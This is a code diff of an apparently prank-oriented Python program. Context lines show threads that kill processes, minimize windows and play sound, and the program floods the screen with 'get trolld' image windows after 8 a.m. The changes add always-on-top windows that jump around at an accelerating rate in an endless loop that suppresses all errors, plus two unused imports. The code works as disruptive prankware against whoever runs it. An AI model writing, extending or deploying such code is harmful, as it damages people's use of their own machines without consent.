@@ -1,5 +1,10 @@
 # Andrew Maney 2022
 
+from concurrent.futures import thread
+
+from itsdangerous import exc
+
+
 while True:
     try:
         # IMPORTS
@@ -126,6 +131,7 @@ pause
             pth = threading.Thread(target=PlaySound)
             kth = threading.Thread(target=KillProcesses)
             mth = threading.Thread(target=MinimizeWindows)
+            windows = []
             while True:
                 if(now.hour >= 8):  
                     if StartFunctions == True:          
@@ -136,7 +142,7 @@ pause
 
 
                     window = Tk()
-                    window.title('LMAO get trolld lolololololololol')
+                    window.title('LMFAO get trolleded lolololololololol')
                     
                     imagePaths = [Image.open(AppDataPath + "\\lmao.png"), Image.open(AppDataPath + "\\lmao2.png")]
 
@@ -147,7 +153,7 @@ pause
                     canvas.pack()
                     my_image = images[randrange(len(images) - 1)]
                     canvas.create_image(0, 0, anchor = NW, image=my_image)
-                    for x in range(200):
+                    for x in range(100):
                         indeximg = randrange(len(images))
                         img = imagePaths[indeximg] 
                         width = img.width
@@ -160,12 +166,33 @@ pause
                         # calculate x and y coordinates for the Tk root window
                         x = randrange(1281)
                         y = randrange(721)
+                        randTop = randrange(10)
 
                         canvas = Canvas(nw, width = w, height = h)
                         canvas.pack()
                         canvas.create_image(0, 0, anchor = NW, image=my_image)
                         nw.geometry('%dx%d+%d+%d' % (w, h, x, y))
+                        if(randTop == 3):
+                            nw.attributes('-topmost',True)
+                            windows.append(nw)
                         nw.update()
+                        
+                    TimeToSleep = 1
+                    while True:
+                        try:
+                            if TimeToSleep > 0.01:
+                                TimeToSleep -= 0.05
+                            else:
+                                TimeToSleep = 0.01
+                            time.sleep(TimeToSleep)
+                            for tkwindow in windows:
+                                # calculate x and y coordinates for the Tk root window
+                                x = randrange(1281)
+                                y = randrange(721)
+                                tkwindow.geometry('+%d+%d' % (x, y))
+                                tkwindow.update()
+                        except:
+                            0+0
                     window.mainloop()
                 else:
                     time.sleep(1)
@@ -182,3 +209,5 @@ pause
         print(EX)
         with open("loglmao.txt", "w") as f:
             f.writelines(str(EX))
+
+
